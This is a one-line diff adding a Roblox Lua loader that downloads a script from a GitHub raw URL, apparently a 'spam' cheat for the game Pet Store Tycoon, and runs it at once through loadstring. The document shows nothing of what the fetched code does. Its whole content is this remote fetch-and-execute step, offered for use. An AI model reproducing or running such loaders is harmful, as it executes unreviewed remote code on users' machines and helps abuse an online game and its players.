@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/pet-store-tycoon-spam1-5c7hltvvhblzll.lua"))()
